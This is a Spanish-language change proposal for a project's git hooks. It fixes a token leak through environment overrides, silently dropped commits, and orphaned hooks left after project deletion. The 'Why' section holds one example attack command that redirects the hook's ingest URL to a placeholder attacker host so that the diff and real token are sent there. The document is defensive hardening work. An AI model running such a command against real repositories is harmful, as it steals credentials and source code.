# Proposal

## Why

La revisión de Codex sobre los hooks de proyectos locales encontró tres defectos reales:

1. **Fuga del token (alta).** El hook deja que `INGEST_URL` e `INGEST_TOKEN` del *entorno* manden
   sobre `hook.env`. Cualquier proceso que ejecute `INGEST_URL=https://atacante git commit` en un
   repo con hooks de Duelo hace que el hook envíe el diff y el token real (leído del fichero) a ese
   host.
2. **Commits descartados en silencio (media).** `HOOK_ENV_PATH` decide dónde *escribe* el token la
   API, pero el bloque del hook no recibe esa ruta: con una ruta personalizada el hook busca en
   `~/.config/duelo/hook.env`, no encuentra credenciales y no envía nada, sin avisar.
3. **Hooks huérfanos con token (media).** `DELETE /projects/{slug}` borra el proyecto y su historial
   y solo después intenta quitar los hooks. Si eso falla devuelve 204 y deja hooks activos sin
   registro desde el que reintentar la limpieza.

## What Changes

- El hook lee las credenciales **solo del fichero** de credenciales; ya no existe override por
  entorno de `INGEST_URL` ni `INGEST_TOKEN`. La URL debe ser `http` o `https` con host.
- El bloque instalado lleva la ruta del fichero de credenciales como `--env-file <ruta>` (entre
  comillas simples de shell, dato fijado por el instalador) y el módulo del hook la usa. Reinstalar
  sobre un bloque antiguo lo reemplaza (ya era idempotente).
- La baja desinstala los hooks **antes** de borrar: si la desinstalación falla, el proyecto se
  conserva y la API responde 409 con un mensaje accionable. Si la carpeta ya no existe, la baja se
  completa. Ajustes muestra ese error al quitar un proyecto.

## Capabilities

### Modified Capabilities
- `local-projects`: los requisitos «Hooks de git que informan de cada commit y push» y «Baja de un
  proyecto» cambian como arriba.

## Impact

- Código: `entrypoints/hook.py`, `adapters/git/hook_installer.py`, `application/local_projects.py`,
  el router de proyectos y el mapeo de errores; `frontend/src/features/settings` para mostrar el error.
- API: `DELETE /projects/{slug}` documenta un 409 nuevo (cambio aditivo de contrato).
- Hooks ya instalados: siguen funcionando (sin `--env-file` leen la ruta por defecto) pero conservan
  el comportamiento antiguo hasta reinstalarlos; basta con volver a dar de alta o reinstalar.
